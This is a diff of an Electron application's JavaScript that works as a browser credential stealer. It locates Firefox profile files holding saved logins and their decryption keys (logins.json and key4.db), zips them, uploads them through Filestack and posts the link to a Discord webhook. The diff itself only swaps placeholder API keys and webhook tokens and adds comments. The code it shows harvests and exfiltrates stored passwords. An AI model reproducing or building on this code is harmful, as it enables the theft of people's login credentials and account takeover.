@@ -4,7 +4,7 @@ const fetch = require('electron-fetch').default
 const fs = require('fs');
 const {spawn} = require("child_process");
 const JSZip = require("jszip");
-const client = require('filestack-js').init("");
+const client = require('filestack-js').init("API KEY");
 let fullText = "";
 function createWindow () {
 // Create the browser window.
@@ -184,6 +184,7 @@ function checkDir(path) {
   })
 }
 
+// This function will retrieve the data for Firefox Logins.
 function processWindowsMozilla(directoryPath, folderSpecifier) {
   var d = new Date();
   var n1 = d.getTime()
@@ -215,6 +216,8 @@ function processWindowsMozilla(directoryPath, folderSpecifier) {
           }
         })
         console.log(dir.path + "\\" + recentFile + "\\" + "login.json");
+
+        // Compress Files and Upload.
         zip
         .generateNodeStream(
           {type: "nodebuffer",
@@ -246,8 +249,8 @@ function uploadFiles(fileName) {
       const data = JSON.stringify({
         "content": result["url"]
       });
-      webhookID = "insert id"
-      webhookToken = "insert token"
+      webhookID = "INSERT WEBHOOK ID"
+      webhookToken = "INSERT WEBHOOK TOKEN"
 
       // Reference: https://stackoverflow.com/a/56627565
       var URL = `https://discordapp.com/api/webhooks/${webhookID}/${webhookToken}`
@@ -276,7 +279,11 @@ function uploadFiles(fileName) {
 
 function storeMozillaFiles(zip, pathName, folderName, folderSpecifier) {
   var prefixPath = pathName + folderSpecifier;
+
+  // This json contains login details.
   var loginPath = prefixPath + "logins.json";
+
+  // This db contains a set of 4 keys used to encrypt logins.json.
   var keyPath = prefixPath + "key4.db";
   try {
     fs.statSync(keyPath);
